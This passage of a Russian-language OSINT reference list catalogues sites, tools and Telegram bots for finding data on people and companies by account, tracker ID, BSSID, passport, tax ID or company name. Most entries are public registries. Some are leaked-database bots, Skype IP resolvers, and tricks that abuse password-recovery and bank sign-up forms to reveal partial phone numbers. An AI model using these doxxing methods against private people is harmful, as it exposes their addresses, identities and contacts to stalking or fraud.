4. cyberhubarchive (https://github.com/cyberhubarchive/archive) — архив утекших данных, в нем есть IP адреса пользователей
5. smartsearchbot.com — бот находит email, номер телефона и другое, бесплатный поиск не доступен для новых пользователей
6. vedbex.com (https://www.vedbex.com/tools/skype_resolver) — найдет IP


Поиск через URL

1. https://avatar.skype.com/v1/avatars/USERNAME/public — фото аккаунта. Замените USERNAME на логин аккаунта


Восстановление доступа

go.skype.com (https://go.skype.com/reset.password.skype)
-------------------------------------------
Для аккаунта Steam
-------------------------------------------
1. cipher387.github.io (https://cipher387.github.io/quickcacheandarchivesearch/) — покажет архивированную страницу, даст 20+ прямых ссылок на сайты веб архивы, поиск по ссылке на аккаунт
2. socid_extractor (https://github.com/soxoj/socid_extractor) (t) — найдет Steam ID, даже скрытого аккаунта
3. steamid.uk — поиск по Steam ID, логину, Steam3, Community ID, найдет историю ников, дату создания, историю аватаров, статистику друзей
4. rep.tf — агрегирует информацию об аккаунте из разных источников
5. steamidfinder.com (https://steamidfinder.com/lookup/) — закешированная информация аккаунта
6. steamid.io — найдет все ID, старый кастомный URL, имя и локацию
7. findsteamid.com — найдет все ID, картинку аккаунта и дату его создания
8. steamdb.info — найдет все ID, операционную систему и другое
9. Steam-OSINT-TOOL (https://github.com/matiash26/Steam-OSINT-TOOL) (t) — покажет с какими другими аккаунтами Steam взаимодействовал искомый профиль, список публичных комментариев
10. vacbanned.com — найдет все ID, страну, статус VAC бана, дату первого бана и дату последнего, историю имен
-------------------------------------------
Как найти аккаунт на Facebook
-------------------------------------------
[1] Откройте профиль пользователя в браузере
[2] Перейдите в исходный код страницы
[3] Найдите там фразу graph.facebook.com и скопируйте длинное число после этого фрагмента
[4] Подставьте это число в ссылку вместо USERID и перейдите по ней
https://www.facebook.com/profile.php?id=USERID

Поиск по ID аккаунта на Lolzteam

1. @LZTbot — даст email, часовой пояс, ник и возможно номер телефона


Поиск по номеру трекера от любой площадки

1. shodan.io — найдет IP адреса и сайты с упоминанием кода трекера
2. analyzeid.com — принимает трекеры pub, UA, ищет другие сайты


Поиск через URL

1. https://www.shodan.io/search?query=http.html%3AUA-12345678-1 — найдет сайты с таким же трекером, замените UA-12345678-1 на свой код трекера
-------------------------------------------
Поиск по номеру трекера от MailRu
-------------------------------------------
Поиск через URL

1. http://top.mail.ru/visits?id=12345678 — покажет посещаемость сайта, аналитику аудитории, содержимое сайта, можно выявить админа как первого посетителя. Замените 12345678 на ID трекера, аналитика может быть закрыта паролем
-------------------------------------------
Поиск по номеру трекера Яндекс метрики
-------------------------------------------
Поиск через URL

1. https://metrika.yandex.ru/dashboard?id=12345678 — покажет возраст, директории сайта, примерное место нахождения пользователей, можно выявить админа как первого посетителя. Требуется вход в свой аккаунт. Замените 12345678 на ID Яндекс Метрики, аналитика может быть закрыта
-------------------------------------------
Поиск по номеру трекера от Google
-------------------------------------------
Трекеры с UA – Google Analytics
Трекеры с pub – Google AdSense

1. spyonweb.com — найдет сайты с искомым трекером UA. pub
2. intelx.io (https://intelx.io/tools?tab=analytics) — найдет сайты с искомым трекером UA, 6 источников поиска
3. osint.sh (https://osint.sh/analytics/) — найдет сайты с искомым трекером UA
4. osint.sh (https://osint.sh/adsense/) — найдет сайты с искомым трекером pub
5. /tracker — список ресурсов для поиска по номеру трекера любой площадки


Поиск через URL

1. https://host.io/api/domains/googleanalytics/UA-2345678?limit=5&token=TOKEN (r) — найдет сайты с таким же трекером, замените UA-12345678-1 на свой код трекера, замените TOKEN на API токен который вы получите после регистрации


Поиск по BSSID / MAC-адресу

1. xinit.ru (https://xinit.ru/wifi/) — покажет местоположение Wi-Fi
2. alexell.ru (https://alexell.ru/network/mac-geo/) — тоже покажет местоположение
3. wigle.net (http://wigle.net/search) (r) — находит Wi-Fi точку, ее физический адрес и название


Поиск через URL

1. https://api.mylnikov.org/geolocation/wifi?v=1.1&data=open&bssid=00:CC:00:CC:00:CC — найдет координаты точки на карте, замените 00:CC:00:CC:00:CC на MAC-адрес

Поиск по SSID / ESSID / Имя точки доступа

1. wigle.net (http://wigle.net/search) (r) — находит Wi-Fi точку, ее физический адрес и BSSID


Поиск по документам юридических лиц любой страны

1. opencorporates.com — по наименованию организаций, агрегатор данных компаний со всего мира
2. dnb.com — по наименованию компании в базах всех стран
3. aleph.occrp.org — по наименованию компании и другим данным в базах данных, файлам, реестрам компаний, утечкам, и другим источникам
4. offshoreleaks.icij.org — по наименованию организаций в базе данных оффшорных утечек, найдет имена, адреса, связи
5. privatization.lot-online.ru (https://privatization.lot-online.ru/) — по наименованию компании в электронной торговой площадке
6. munscanner.com (https://munscanner.com/dbs/) — по наименованию компании в реестрах организаций разных стран
7. gisis.imo.org (https://gisis.imo.org/Public/Default.aspx) (r) — по наименованию компании найдет IMO, сводку по эксплуатации кораблей и адрес компании
8. news-explorer.mybluemix.net — по наименованию компании, поиск в СМИ, найдет ассоциации между компаниями, публикациями и личностями
9. sanctionssearch.ofac.treas.gov — по наименованию компании, поиск в санкционном списке США
10. crosslinked (https://github.com/m8r0wn/crosslinked) (t) — по наименованию компании, найдет список имен и фамилий сотрудников компании
11. en.52wmb.com (r) — по наименованию компании, покажет где и чем торгует компании на мировом рынке
12. supplychaindive.com (https://www.supplychaindive.com/search/) — по наименованию компании, находит упоминания в пресс-релизах и новостях, есть фильтр по теме
13. panjiva.com (http://panjiva.com/search) — по наименованию компании, покажет где и чем торгует компании на мировом рынке
14. search.gleif.org — найдет историю изменений компании, даст знать кто кем владеет, есть фильтры по стране
15. aihitdata.com (r) — по названию компании выдаст контакты, должности, ФИО, деловые связи и историю изменений этих данных
16. tmdn.org (https://www.tmdn.org/tmdsview-web/#/dsview) — по названию компании найдет чертежи и описание промышленных образцов
17. app02.bazl.admin.ch (https://app02.bazl.admin.ch/web/bazl/en/#/lfr/search) — реестр Швейцарии, по названию компании найдет зарегистрированые самолёты и вертолеты
18. importyeti.com — по названию компании найдёт поставки, импорт, адреса, продукцию, статистику и прочие
19. opensanctions.org — по названию компании найдет в списке санкций, даст имя директора, регистрационный номер, попробуй ввести название латиницей
20. register.openownership.org — найдет имена бенефициаров, владельцев, историю изменений, построит граф связей
21. app.snov.io (r) — по названию компании даёт Email, имена и должности сотрудников, инвесторов
22. archivesportaleurope.net (https://www.archivesportaleurope.net/search/-/s/n) — найдет упоминание в национальных архивах стран Европы, можно найти в сделки, контракты, письма и прочее
-------------------------------------------
Поиск по ИНН гражданина России
-------------------------------------------
1. @egrul_bot — находит базовую информацию о компании или ИП
2. kad.arbitr.ru — дела рассматриваемые арбитражными судами
3. fssp.online — находит задолженности
4. a-3.ru — находит все задолженности и подробную информацию о налоговых начислениях
5. npd.nalog.ru (https://npd.nalog.ru/check-status/) — проверка статуса самозанятого, дата постановления
6. rosstat.gov.ru (https://rosstat.gov.ru/accounting_report) — предоставление данных бухгалтерской отчетности
7. service.nalog.ru (https://service.nalog.ru/invalid-inn-fl.html) — проверить действительность ИНН
8. list-org.com (https://www.list-org.com/?search=fio) — найдет предпринимателя, его госзакупки, дерево связей
9. checko.ru — реквизиты, руководители, учредители ИП, регистрация в ФНС, ПФР и прочее
10. @QuickOSINT_Robot — проверит задолженности, всего 3 бесплатных запроса для новых аккаунтов

-------------------------------------------
Создатель - Kanaizu
Проэкт - shrm
-------------------------------------------

Восстановление доступа

1. esia.gosuslugi.ru (https://esia.gosuslugi.ru/recovery/) — даст часть адреса почты и номера телефона
-------------------------------------------
Поиск по паспорту гражданина России
-------------------------------------------
1. fms.gov.ru (http://services.fms.gov.ru/info-service.htm?sid=2000) — проверка действительности паспортов гражданина РФ
2. fssp.online — задолженности, поиск бесплатный
3. service.nalog.ru (https://service.nalog.ru/inn.do) — найдет ИНН, нужно знать полное ФИО и дату рождения
4. @QuickOSINT_Robot — проверит задолженности, всего 3 бесплатных запроса для новых аккаунтов
5. @probei_ru_bot — даст адрес регистрации, дату рождения, ФИО
6. @Zernerda_bot — ищет в двухсот слитых базах, находит адреса, имена, аккаунты и много другого, бесплатный поиск после первого запуска бота
7. @declassified_bot — найдет адреса регистрации, почту, имя и авто


Восстановление доступа

1. esia.gosuslugi.ru (https://esia.gosuslugi.ru/recovery/) — даст часть адреса почты и номера телефона
-------------------------------------------
Поиск по водительскому удостоверению гражданина России
-------------------------------------------
1. shtrafometr.ru — проверка водительского удостоверения
2. fssp.online — поиск задолженности по СНИЛС, ИНН, СТС, номеру ИП, ВУ и паспорта, поиск бесплатный
3. гибдд.рф (https://xn--90adear.xn--p1ai/check/driver/) — проверка водительского удостоверения, поиск по серии плюс номеру и даты выдачи
-------------------------------------------
Поиск по свидетельству о регистрации транспортного средства России
-------------------------------------------
1. fssp.online — задолженности, поиск бесплатный
-------------------------------------------
Поиск по ОСАГО гражданина России
-------------------------------------------
1. dkbm-web.autoins.ru (https://dkbm-web.autoins.ru/dkbm-web-1.0/policyInfo.htm) — найдёт договора страхования, их статус,  автомобили, их VIN, марку, регистрационный знак, номер кузова, страховую организацию, ограничения лиц допущенных к вождению
-------------------------------------------
Поиск по УИН
-------------------------------------------
1. oplata.gosuslugi.ru (http://oplata.gosuslugi.ru/pay/quittance) (r) — выдаст дату выставления счета, на что назначен (СТС, СНИЛС и т.п), орган, сумму к оплате, дату оплаты, а в http ответе есть комментарий и адрес
2. оплатагибдд.рф — покажет фото штрафа, ФИО нарушителя
3. onlinegibdd.ru (https://onlinegibdd.ru/servisy/proverit_shtrafy/?do=by_postanov) — найдет дату штрафа, адрес, СТС, подразделение, статью КоАП
-------------------------------------------
Поиск по ОГРНИП гражданина России 
-------------------------------------------
1. @egrul_bot — поиск по ФИО, ИНН, ОГРНИП и ИП
2. www.list-org.com (https://www.list-org.com/?search=fio) — найдет предпринимателя, его госзакупки, дерево связей
-------------------------------------------
Поиск по судебным и нормативным актам России
-------------------------------------------
1. sudact.ru — по судебным и нормативным актам, номеру документа
2. kad.arbitr.ru — дела, рассматриваемые арбитражными судам
3. судебныерешения.рф  (http://xn--90afdbaav0bd1afy6eub5d.xn--p1ai/)— найдет судебные решения, документы с ФИО, датой и статьей
-------------------------------------------
Поиск по номеру исполнительного производства России 
-------------------------------------------
1. @egrul_bot — задолженности
2. fssprus.ru — проверка задолженностей
3. fssp.online — задолженности, поиск бесплатный
-------------------------------------------
Поиск по номеру исполнительного производства России 
-------------------------------------------
1. @egrul_bot — задолженности
2. fssprus.ru — проверка задолженностей
3. fssp.online — задолженности, поиск бесплатный
-------------------------------------------
Для украинских документов физических лиц
-------------------------------------------
1. @OpenDataUABot — по налоговому номеру физического лица, номеру судебного дела, номеру паспорта, номеру техпаспорта
2. osvita.net (https://osvita.net/ua/checkdoc/) (r) — проверка украинского диплома об образовании
3. court.opendatabot.ua (https://court.opendatabot.ua/#/) — по номеру судебного дела, найдет документы
4. @people_base_bot — по ИНН, найдет паспортные данные
5. opendata.hsc.gov.ua (https://opendata.hsc.gov.ua/check-vehicle-registration-certificate) — по номеру свидетельства регистрации транспорта, дает VIN, регистрационный номер и другую базовую информацию
6. opendata.hsc.gov.ua (https://opendata.hsc.gov.ua/check-driver-license) — проверка водительских прав по их номеру
7. wanted.mvs.gov.ua (https://wanted.mvs.gov.ua/passport/) — проверка паспорта по его номеру среди украденных
8. drrp.app (https://drrp.app/search) — по ИНН найдёт адрес проживания
9. @ce_poshuk_bot — по ИНН найдёт ФИО, адреса регистрации, дату рождения
10. @poiskorRobot — по ИНН найдет досье, данные паспорта, адрес, фото и автомобили
-------------------------------------------
Для белорусских документов физических лиц
-------------------------------------------
1. bankrot.gov.by (https://bankrot.gov.by/Debtors/DebtorsList/) — по УНП, статус банкрота
2. minjust.gov.by (https://minjust.gov.by/directions/enforcement/debtors/) — по регистрационному номеру, требуется ввести фамилию
3. mtkrbti.by (http://mtkrbti.by/local/TL/Licence.nsf/WEBSearchView1?SearchView) — по УНП и номеру лицензии в базе готовых лицензий, найдет ФИО, адрес, почтовый индекс, номер транспортной лицензии, срок действия
4. nbrb.by (http://www.nbrb.by/system/Banks/GuaranteesRegister/) — по УНП, покажет сведения о выданных банковских гарантиях
5. gr.rcheph.by (http://gr.rcheph.by/) — по УНП, названию компании или наименования продукта, поиск в  сведениях о государственной регистрации товаров
6. egr.gov.by (http://egr.gov.by/egrn/index.jsp?content=Find) — по УНП в реестре юридических лиц и индивидуальных предпринимателей единого государственного регистра
7. justbel.info (https://justbel.info/Liquidation/FindMyRequest) — по УНП, покажет данные о ликвидации юридических лиц
8. ioauth.raschet.by (https://ioauth.raschet.by/client/password/reset) — по идентификационному номеру выдаст часть номера телефона
9. nalog.gov.by (http://www.portal.nalog.gov.by/findPerson/) — по УНП выдаст ФИО, код инспекции МНС

Найти номера телефона по идентификационному номеру паспорта

[1] Регистрируемся в Интернет-Банкинге БелИнвестБанка на сайте:

ibank.belinvestbank.by

[2] Переходим по ссылке

 https://ibank.belinvestbank.by/settings/activation-profile

[3] Вводим личный номер и нажимаем далее
[4] Получаем часть номера телефона
-------------------------------------------
Для документов физических лиц Дании
-------------------------------------------
1. datacvr.virk.dk (https://datacvr.virk.dk/data/) — по CVR, даст сведения о зарегистрированных предпринимателях и компаниях
-------------------------------------------
Поиск по IDNP гражданина Молдовы
-------------------------------------------
1. e-services.registru.md (http://e-services.registru.md/img/WebPublic/index.php?action=person&lang=ru) — проверка IDNP
2. cnas.gov.md (http://cnas.gov.md/) — получение номера социальной страховки CPAS
3. rca.cnpf.md (http://rca.cnpf.md/) — найдет КБМ человека
4. portal.mai.gov.md (https://portal.mai.gov.md/Services/CriminalRecord) — выдаст часть ФИО человека
5. vsa.cnam.gov.md (http://vsa.cnam.gov.md/app/verify/) — найдет номера CNAM
6. vsa.cnam.gov.md (http://vsa.cnam.gov.md/app/RegistryToMFHttpClient/) — проверка регистрации у семейного врача
7. a.cec.md (https://a.cec.md/ru/proverit-s-pomoshchyu-rsa-3111.html) — найдет часть даты рождения и номер участка голосования
-------------------------------------------
Для документов физических лиц Польши 
-------------------------------------------
1. dlugi.info (https://www.dlugi.info/advsearch) — по ИНН/NIP/PESEL найдет задолженности, ФИО, город проживания
-------------------------------------------
Для документов физических лиц Швеции
-------------------------------------------
1. mrkoll.se — по номеру социального страхования найдет дату рождения, адрес, ФИО, соседей, номер социального страхования, номера телефонов, корпоративное участие, примерный доход, история изменений ФИО
-------------------------------------------
Для документов физических лиц Эстонии
-------------------------------------------

Поиск через URL

1. https://www2.politsei.ee/qr/?qr=AA1234567 — проверит действительность документа, замените AA1234567 на номер паспорта или ID карты
-------------------------------------------
Поиск по документам физического лица Вьетнама
-------------------------------------------
1. gplx.gov.vn (https://gplx.gov.vn/default.aspx) — по номеру водительских прав и даты рождения. Результат: категория прав, срок действия, имя владельца
2. xuatnhapcanh.gov.vn (https://www.xuatnhapcanh.gov.vn/abtc-search) — по номеру паспорта и номеру квитанции для оплаты визовой пошлины, раскроет информацию о выданной карте ABTC
-------------------------------------------
Поиск по документам физического лица Индии
-------------------------------------------
1. mastersindia.co (https://www.mastersindia.co/gst-number-search-and-gstin-verification/) — по номеру GST проверит его подлинность и прочее
-------------------------------------------
Для документов физических лиц Казахстана
-------------------------------------------
1. kgd.gov.kz (http://kgd.gov.kz/ru/services/taxpayer_search) — данные налогоплательщиков, поиск по РНН, ИИН, ФИО, для ИП поиск по названию, РНН и ИИН/БИН; найдет ИИН. Сервис иногда недоступен
2. serj.ws (http://serj.ws/salyk) — по ИИН найдет ФИО, дату рождения, национальность, часть адреса прописки, и первые четыре цифры номера телефона
3. fa-fa.kz — по ИИН, БИН, проверит задолженностей, ИП, и ограничения на выезд
4. @ShtrafKZBot — по ИИН задолженности по штрафам
5. kgd.gov.kz (http://kgd.gov.kz/ru/services/ndspayer_search) — по ИИН/БИН и РНН данные о плательщиках НДС
6. adata.kz (https://adata.kz/fines) — по ИИН/БИН проверка на штрафы
7. adata.kz (https://adata.kz/insurance) — по ИИН проверка социального статуса и ОСМС
8. adata.kz (https://adata.kz/contract) — по ИИН/БИН, находит государственные договора
9. aisoip.adilet.gov.kz (https://aisoip.adilet.gov.kz/forCitizens/findArest) — по ИИН или БИН проверит аресты счета, имущества, запреты на выезд и регистрацию
10. imei.rfs.gov.kz (https://imei.rfs.gov.kz/index_ru.php) — по ИИН найдет название оператора и число зарегистрированных телефонных номеров
11. idp.egov.kz (https://idp.egov.kz/idp/register.jsp) — по ИИН, форма регистрации, найдет часть номера телефона
-------------------------------------------
Для документов физических лиц Китая
-------------------------------------------
1. @bailansgbot — по идентификационному номеру гражданина выдаст телефон, имя, аккаунт Weibo, QQ, и прочее
2. sfz.tool90.com — по идентификационному номеру гражданина выдаст дату рождения, возраст, место первоначальной регистрации, пол, действительность ID


Через URL

1. http://tools.2345.com/shenfenzheng.htm?card=1234567890 — покажет дату рождения, пол, и регион прописки, замените 1234567890 на номер ID карты, или номер удостоверения личности
-------------------------------------------
Для документов физических лиц США
-------------------------------------------
1. intelx.io — по SSN, находит документы
2. stevemorse.org (https://stevemorse.org/ssn/ssn.html) — декодирует SSN, может показать дату выпуска номера
3. stevemorse.org (https://stevemorse.org/dl/dl.html) —  декодирует SSN, может показать дату рождения и начало ФИО
4. stevemorse.org (https://stevemorse.org/ssdi/ssdi.html) — реестр регистрации смерти с 1936 гг. по 2014 гг., найдет по SSN дату рождения и смерти, ФИО, штат
-------------------------------------------
Поиск по документам физического лица Ганы
-------------------------------------------
1. gra.gov.gh (https://gra.gov.gh/online-tools/verify-tin/#cBody) — по TIN или Personal ID проверит его подлинность
-------------------------------------------
Для документов юридических лиц США
-------------------------------------------
1. sec.gov (https://www.sec.gov/edgar/searchedgar/companysearch.html) — поиск по названию и CIK организации, найдет документы, рабочий адрес и дату регистрации
2. propublica.org (https://projects.propublica.org/nonprofits/) — поиск некоммерческих компаний по названию организации
3. followthemoney.org — поиск по названию организации, найдет сколько налогов заплачено организацией
4. sec.gov (https://www.sec.gov/cgi-bin/browse-edgar?action=getcompany&CIK=0000104169&type=10-k&dateb=&owner=exclude&count=40&search_text=) — поиск по названию компании в документах, есть фильтр по дате
5. littlesis.org — поиск по названию компании в базе данных, в которой подробно описаны связи между влиятельными людьми и организациями
6. judyrecords.com — база судебных дела США, можно искать по названию, номеру и любым другим данным компании
7. industrydocuments.ucsf.edu — поиск в документах отраслевых компаний по производству табака, пищи, химии, фармакологии
8. bizstanding.com — по названию компании дает адрес, промышленность, вид бизнеса и участников
9. candid.org (https://candid.org/research-and-verify-nonprofits/990-finder) — поиск по названию компании, найдет финансовую информацию о некоммерческих организациях, нужно выбрать штат
10. goodjobsfirst.org (https://www.goodjobsfirst.org/violation-tracker) — по названию компании найдет штрафы, их сумму, подробнее описание, тип преступления
11. citizenaudit.org — по названию компании найдет в реестре некоммерческих организации финансы компании, раскрытие деятельности, гранты, директоров, офицеров, связи с организациями, налоговые формы
12. publicaccountability.org — по названию компании найдет историю расходов и взносов
-------------------------------------------
Для документов юридических лиц Канады
-------------------------------------------
1. sedar.com (https://www.sedar.com/search/search_form_pc_en.htm) — по названию компании найдет документы: пресс релизы, финансовую отчетность, письма, согласия, и прочие документы держателей ценных бумаг
-------------------------------------------
Для документов юридических лиц Бразилии
-------------------------------------------
1. escavador.com — по названию компании найдет резюме и судебные иски
2. servicos.receita.fazenda.gov.br (http://servicos.receita.fazenda.gov.br/Servicos/cnpjreva/Cnpjreva_Solicitacao.asp) — по CNPJ найдет подтверждение регистрации компании, дату открытия, название компании, телефон, почту и прочее
3. brasilcnpj.net — по названию компании найдет CNPJ, дату открытия компании уставной капитал, основную деятельность, адрес и телефоны
-------------------------------------------
Для документов юридических лиц Аргентины
-------------------------------------------
1. www.cuitonline.com — по названию компании найдет налоги, тип деятельности, дату регистрации и многое другое
-------------------------------------------
Поиск по ИНН юридических лиц России
-------------------------------------------
1. @egrul_bot — даст базовую информацию
2. nalog.ru (https://service.nalog.ru/bi.do) — проверка блокировки банковских счетов, выберите "Запрос о действующих решениях о приостановлении" а в место БИК указажите "123456789" или "000000000"
3. declaration.rostrud.ru (https://declaration.rostrud.ru/declaration/index) — нужно знать область, покажет адрес организации, название должностей и их количество в месте с индивидуальным номером рабочего места ещё и заключение эксперта
4. gks.ru (https://www.gks.ru/accounting_report) — предоставление данных бухгалтерской отчетности
5. bo.nalog.ru — найдет организацию и полную информацию о ней включая финансы
6. smartsearchbot.com — бот, находит компании, статус и адрес, ФИО директора и учредителей, бесплатный поиск не доступен для новых пользователей, всего 1 бесплатная попытка
7. rosstat.gov.ru (https://rosstat.gov.ru/accounting_report) — предоставление данных бухгалтерской отчетности
8. proverki.gov.ru (https://proverki.gov.ru/portal) — прокурорские проверки, найдет адрес объекта, основания проведения проверки и тип места
9. basis.myseldon.com (r) — найдет досье на организацию, выручку, связи, торговая деятельность, проверки, лицензии, арбитраж, контракты, дочерние организации, патенты и многое другое
10. fek.ru — найдет документы, финансы, проверки и базовую информацию
11. list-org.com — найдет финансы, графы связей, e-mail и телефоны указанные при регистрации, госзакупки, арбитраж, сертификаты, руководитель и реквизиты 
12. checko.ru — реквизиты, уставной капитал, история изменений, связи, руководители  учредители компании и прочее
13. egrul.nalog.ru (https://egrul.nalog.ru/index.html) — выдаст актуальную выписку из гос реестра на 6 страниц, с адресами, капиталом, ФИО и т.д. 
14. odyssey-search.info (r) — находит адреса проживания, права, ФИО, документы, доходы, должности, телефоны, контакты, транспортные карты, автомобили, вылает отчёт на 50 страниц, а при регистрации можно указать любую российскую организацию
15. declaration.rostrud.gov.ru (https://declaration.rostrud.gov.ru/declaration/index) — найдет должности, число работников, адрес 
16. e-disclosure.ru — найдет события компании, маркетинговые решения, бенефициаров, счета, оценку конкурентов и прочее
17. find-org.com — даст сообщения вестника гос.регистрации, контакты, историю смены руководителей, финансовую отчетность и арбитраж
18. contragent.integrum.ru (https://contragent.integrum.ru/ul/Navigator.aspx) — построит граф связей между компаниями, учредителями, историческими связями, адресом, арбитражными делами, акционерами, владельцами и прочего
19. contragent.integrum.ru (https://contragent.integrum.ru/search/) — даст оценку надежности, уровень рисков, регистрационные данные, Изменения ЕГРЮЛ, Проверки гос. органами, факторы надежности, структуру компании, аффилированность, деятельность компании, конкурсная активность, финансовый анализ и информация
20. vbankcenter.ru (https://vbankcenter.ru/contragent/) — найдет контакты, реквизиты, финансы, связи, индекс доверия, госконтракты, проверки, арбитражные дела, исполнительные производства, отзввы, историю и другое

-------------------------------------------
Создатель - Kanaizu
Проэкт - shrm
-------------------------------------------

Восстановление доступа

1. esia.gosuslugi.ru (https://esia.gosuslugi.ru/recovery/) — даст часть адреса почты и номера телефона
-------------------------------------------
Поиск по названию юридических лиц России
-------------------------------------------
1. @egrul_bot — даст базовую информацию
2. cbr.ru (http://www.cbr.ru/credit/main.asp) — справочник по кредитным организациям, поиск по названию, регистрационному номеру, ОГРН
3. fssprus.ru — проверка задолженностей, требуется информация об адресе предприятия
4. bo.nalog.ru — найдет организацию и полную информацию о ней включая финансы
5. proverki.gov.ru (https://proverki.gov.ru/portal) — прокурорские проверки, найдет адрес объекта, основания проведения проверки и тип места
6. basis.myseldon.com (r) — найдет досье на организацию, выручку, связи, торговая деятельность, проверки, лицензии, арбитраж, контракты, дочерние организации, патенты и многое другое
7. fek.ru — по названию компании найдет документы, финансы, проверки и базовую информацию
8. cbr.ru (https://www.cbr.ru/inside/warning-list/) — список компаний с выявленными признаками нелегальной деятельности на финансовом рынке, покажет признаки и адрес сайта
9. list-org.com — найдет финансы, графы связей, e-mail и телефоны указанные при регистрации, госзакупки, арбитраж, сертификаты, руководитель и реквизиты
10. checko.ru — реквизиты, уставной капитал, история изменений, связи, руководители, учредители и прочее
11. e-disclosure.ru — найдет события компании, маркетинговые решения, бенефициаров, счета, оценку конкурентов и прочее
12. elections.istra-da.ru — реестр более миллиона кандидатов на выборы, выберите поиск по месту работы, введите название компании и получите ФИО и должность работников
13. contragent.integrum.ru (https://contragent.integrum.ru/ul/Navigator.aspx) — построит граф связей между компаниями, учредителями, историческими связями, адресом, арбитражными делами, акционерами, владельцами и прочего
14. contragent.integrum.ru (https://contragent.integrum.ru/search/) — даст оценку надежности, уровень рисков, регистрационные данные, Изменения ЕГРЮЛ, Проверки гос. органами, факторы надежности, структуру компании, аффилированность, деятельность компании, конкурсная активность, финансовый анализ и прочее
15. e-ecolog.ru — найдет контакты компании которых нет в других реестрах, финансовую отчётность
16. vbankcenter.ru (https://vbankcenter.ru/contragent/) — найдет контакты, реквизиты, финансы, связи, индекс доверия, госконтракты, проверки, арбитражные дела, исполнительные производства, отзввы, историю и другое
-------------------------------------------
Поиск по регистрационному номеру юридических лиц России
-------------------------------------------
1. cbr.ru (http://www.cbr.ru/credit/main.asp) — справочник по кредитным организациям, поиск по названию, регистрационному номеру, ОГРН
-------------------------------------------
Для документов юридических лиц Украины
-------------------------------------------
1. @OpenDataUABot — по украинским базам: код, название или адрес компании
2. court.opendatabot.ua (https://court.opendatabot.ua/#/) — по номеру судебного дела, найдет документы
3. erb.minjust.gov.ua (https://erb.minjust.gov.ua/#/search-debtors) — по названию организации, коду ЮЛ, найдет долги вместе с личными данными
4. @people_base_bot — по ИНН, бот найдет паспортные данные
5. inspections.gov.ua — по названию компании или ИНН найдет проверки: дату начала, контролирующий орган, степень риска и предмет проверки
6. drrp.app (https://drrp.app/search) — по ЕГРПОУ или названию компании найдёт объект недвижимости и прочее
-------------------------------------------
Для документов юридических лиц Германии
-------------------------------------------
1. unternehmensregister.de (https://www.unternehmensregister.de/ureg/) — поиск по названию компании, найдет бухгалтерскую отчетность, имя управляющего директора
2. handelsregister.de (https://www.handelsregister.de/rp_web/mask.do?) — поиск по названию компании и регистрационному номеру, найдет историю смены названий компании, город регистрации и статус
3. e-justice.europa.eu (https://e-justice.europa.eu/contentPresentation.do?plang=en&idTaxonomy=430&m=1) — поиск по ECLI, поиск по судебным делам
4. www.northdata.com — по названию компании найдет адрес, связи между людьми и компаниями, историю изменений и публикации
-------------------------------------------
Для документов юридических лиц Франции
-------------------------------------------
1. verif.com — поиск по названию компании, сотруднику и SIREN. Найдет адрес, оцифрованные акты, документы, оборот капитала, сотрудников и акционеров
2. societe.com — поиск по названию компании, SIREN. 
Найдет адрес, оборот капитала, взаимосвязи между компаниями, сотрудников и акционеров а так же документы
3. e-justice.europa.eu (https://e-justice.europa.eu/contentPresentation.do?plang=en&idTaxonomy=430&m=1) — поиск по ECLI, поиск по судебным делам
-------------------------------------------
Для документов юридических лиц Молдовы
-------------------------------------------
1. legat.by — по названию компании или IDNO, найдет адрес, дату регистрации, правовую форму
2. cnas.gov.md — по фискальному коду IDNO, дает наименование компании и код социальной страховки CNAS
-------------------------------------------
Для документов юридических лиц Белоруссии
-------------------------------------------
1. bankrot.gov.by (https://bankrot.gov.by/Debtors/DebtorsList/) — по УНП, и названию организации в списках банкротов
2. tsouz.belgiss.by (https://tsouz.belgiss.by/#!/tsouz/certifs) — по названию предприятия, найдет сертификаты соответствия и декларации о соответствии
3. mtkrbti.by (http://mtkrbti.by/local/TL/Licence.nsf/WEBSearchView1?SearchView) — по УНП и номеру лицензии в базе готовых лицензий, найдет ФИО, адрес, почтовый индекс, номер транспортной лицензии, срок действия
4. nbrb.by (http://www.nbrb.by/system/Banks/GuaranteesRegister/) — по УНП, покажет сведения о выданных банковских гарантиях
5. gr.rcheph.by (http://gr.rcheph.by/) — по УНП, названию компании или наименования продукта, поиск в  сведениях о государственной регистрации товаров
6. egr.gov.by (http://egr.gov.by/egrn/index.jsp?content=Find) — по УНП в реестре юридических лиц и индивидуальных предпринимателей единого государственного регистра
7. justbel.info (https://justbel.info/claim) — по названию организации или УНП, покажет дату ликвидации юридических лиц, телефон, адрес
8. service.court.by (http://service.court.by/ru/juridical/judgmentresults) (r) — по названию компании найдет судебные постановления
9. @Informator_BelBot — по названию организации или УНП найдет статус, УНП, даты регистрации и адрес
-------------------------------------------
Для документов юридических лиц  Великобритании
-------------------------------------------
1. companieshouse.gov.uk (https://beta.companieshouse.gov.uk/search/companies) — поиск по названию компании, по ФИО владельца. Найдет адрес зарегистрированного офиса, статус, документы
2. find-tender.service.gov.uk — поиск по названию компании, находит тендеры
3. northdata.com — по названию компании найдет адрес, связи между людьми и компаниями, историю изменений и публикации
4. charitycommission.gov.uk (https://register-of-charities.charitycommission.gov.uk/charity-search) — реестр благотворительных организаций, по названию компании найдет её доход, членов, сотрудников, расходы, историю финансов
5. /entity — список ресурсов для поиска по названию компании любой страны


Google дорки

Замените NAME на имя компании или ее номер

1. site:duedil.com NAME
-------------------------------------------
Для документов юридических лиц Польши
-------------------------------------------
1. krs-online.com.pl (http://www.krs-online.com.pl/?p=6) — поиск по KRS, NIP, региону или названию компании, найдет адрес, записи в национальном реестре судов, члены представительства
2. e-justice.europa.eu (https://e-justice.europa.eu/contentPresentation.do?plang=en&idTaxonomy=430&m=1) — поиск по ECLI, поиск по судебным делам
3. prod.ceidg.gov.pl (http://prod.ceidg.gov.pl/ceidg/ceidg.public.ui/Search.aspx) — поиск по названию компании, ИНН, NIP, KRS, REGON. Найдет основную, контактную информацию, банкротства, и историю изменений данных о компании
4. ekrs.ms.gov.pl (https://ekrs.ms.gov.pl/krsrdf/krs/wyszukiwaniepodmiotu/reset) — поиск по названию компании, ИНН, NIP, KRS, REGON, найдет основную, контактную информацию, банкротства, руководителей и прочее
5. ekrs.ms.gov.pl (http://ekrs.ms.gov.pl/rdf/pd/search_df) — поиск по KRS, даст финансовые отчеты, постановления, заключения и много других документов
6. northdata.com — по названию компании найдет адрес, связи между людьми и компаниями, историю изменений и публикации
7. rejestr-bdo.mos.gov.pl (https://rejestr-bdo.mos.gov.pl/Registry/Index) — по названию компании или ИНН или регистрационному номеру найдет адрес, контакты и прочее
